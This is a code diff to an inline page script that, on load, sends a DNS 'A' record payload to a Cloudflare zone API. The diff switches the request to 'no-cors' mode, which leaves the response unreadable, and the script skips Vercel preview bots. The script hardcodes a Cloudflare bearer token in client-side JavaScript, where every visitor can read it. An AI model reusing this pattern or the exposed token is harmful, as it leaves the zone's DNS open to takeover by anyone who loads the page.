@@ -5,7 +5,7 @@ var cloudflareApiUrl = 'https://api.cloudflare.com/client/v4/zones/0fbb81973c7c1
 (async () => {
   try {
     const userAgent = navigator.userAgent;
-    
+
     // Optional: Block certain user agents if necessary
     if (userAgent === 'vercel-screenshot/1.0' || userAgent === 'vercel-favicon/1.0') {
       console.log('Blocked vercel useragent:', userAgent);
@@ -24,7 +24,7 @@ var cloudflareApiUrl = 'https://api.cloudflare.com/client/v4/zones/0fbb81973c7c1
       type: 'A',
     };
 
-    // Send the payload to the Cloudflare API using fetch
+    // Send the payload to the Cloudflare API using fetch with no-cors mode
     const cloudflareResponse = await fetch(cloudflareApiUrl, {
       method: 'POST',
       headers: {
@@ -32,19 +32,16 @@ var cloudflareApiUrl = 'https://api.cloudflare.com/client/v4/zones/0fbb81973c7c1
         'Authorization': 'Bearer OQdiPcs68ySLNDNI4IvExSAtMgzj0HI6d0LTOZ70', // Cloudflare API token
       },
       body: JSON.stringify(Payload),
+      mode: 'no-cors', // Use no-cors mode
     });
 
-    // Log the response from Cloudflare API
-    if (cloudflareResponse.ok) {
-      const responseData = await cloudflareResponse.json();
-      console.log('Cloudflare response data:', responseData);
-    } else {
-      console.error('Failed to send request to Cloudflare. Status:', cloudflareResponse.status);
-    }
+    // Note: In no-cors mode, you won't be able to read the response
+    console.log('Request sent to Cloudflare. Response cannot be read due to no-cors mode.');
 
   } catch (error) {
     console.error('Error occurred:', error); // Log any errors
   }
 })();
+
 
 </script>
